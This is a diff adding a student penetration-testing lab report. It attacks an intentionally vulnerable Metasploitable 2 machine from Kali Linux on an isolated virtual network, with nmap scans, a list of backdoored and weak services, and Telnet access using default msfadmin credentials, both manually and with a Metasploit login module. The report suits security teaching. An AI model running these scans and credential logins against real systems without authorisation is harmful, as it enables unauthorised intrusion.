@@ -1,0 +1,131 @@
+Penetration Testing Learning Lab
+Kali Linux & Metasploitable 2
+
+1. Introduction
+The objective of this lab was to understand how attackers identify, analyze, and exploit vulnerable network services, and to learn why those services are insecure.
+The target machine (Metasploitable 2) is intentionally vulnerable and used strictly for educational purposes in a controlled virtual environment.
+
+2. Lab Environment Setup
+Virtual Machines:
+Attacker Machine: Kali Linux
+IP: 192.168.1.10
+Target Machine: Metasploitable 2
+IP: 192.168.1.20
+
+Default Gateway: 192.168.1.1
+
+Network Configuration
+Both virtual machines were connected using VirtualBox Internal Network.
+Since the internal network does not provide a DHCP server, IP addresses were assigned manually using:
+sudo ifconfig eth0 <IP> netmask 255.255.255.0 broadcast 192.168.1.255
+
+Connectivity was verified using:
+ping 192.168.1.20
+
+IP configuration was confirmed with:
+ifconfig
+
+Issue Faced
+VirtualBox internal networking does not provide a DHCP server, which caused the VMs to lose their IP configuration after reboot.
+Solution
+To permanently assign static IP addresses, the /etc/network/interfaces file was edited: sudo nano /etc/network/interfaces
+
+Configuration added:
+auto eth0
+iface eth0 inet static
+address 192.168.1.x
+netmask 255.255.255.0
+gateway 192.168.1.1
+broadcast 192.168.1.255
+
+3. Enumeration Phase
+3.1 Local Service Inspection (Target)
+
+On Metasploitable 2:
+
+netstat -tulpn
+This command identified services listening locally on the system.
+
+3.2 Remote Scanning (From Kali Linux)
+
+Initial scans were performed using:
+
+nmap -sV 192.168.1.20
+nmap -sU 192.168.1.20
+nmap -p- 192.168.1.20
+
+-sV → Service version detection
+-sU → UDP scan
+-p- → Full TCP port scan
+
+3.3 Detailed Service Enumeration
+
+To perform an active scan with script execution:
+
+nmap -sV -sC -p <open_ports> 192.168.1.20
+
+Unlike basic scanning, this command actively interacts with services to retrieve:
+Software versions
+Configurations
+Known vulnerability indicators
+This helps detect outdated services and misconfigurations.
+
+4. Vulnerability Detection
+
+Based on scan results, several high-risk services were identified:
+Port	Service	Vulnerability
+21	FTP (vsftpd 2.3.4)	Known backdoor
+23	Telnet	Plaintext authentication
+139-445	SMB	Weak authentication & misconfiguration
+6667	realIRCd	Backdoored version
+
+These services expose the system to remote exploitation.
+
+5. Exploitation Phase
+5.1 Telnet Exploitation (Port 23)
+
+Port 23 was confirmed open:
+nmap -p- 192.168.1.20
+
+Manual connection attempt:
+telnet 192.168.1.20
+
+Findings: 
+Telnet required authentication.
+Weak default credentials were used.
+Authentication occurs in plaintext
+
+Login performed using:
+Username: msfadmin
+Password: msfadmin
+
+After login:
+whoami
+Result:
+msfadmin
+This confirmed successful remote shell access as a standard user.
+
+Exploitation Using Metasploit
+
+Metasploit Framework was used to validate vulnerabilities.
+Start framework:
+msfconsole
+Search for Telnet modules:
+search telnet
+Selected module:
+use auxiliary/scanner/telnet/telnet_login
+Configured:
+set RHOSTS 192.168.1.20
+set USERNAME msfadmin
+set PASSWORD msfadmin
+run
+Result: Successful login detected.
+
+6. Post-Exploitation
+
+After gaining access, the command:
+whoami
+was used to verify privilege level.
+The session confirmed access as user msfadmin, demonstrating how weak credentials and plaintext protocols can lead to unauthorized remote access.
+
+
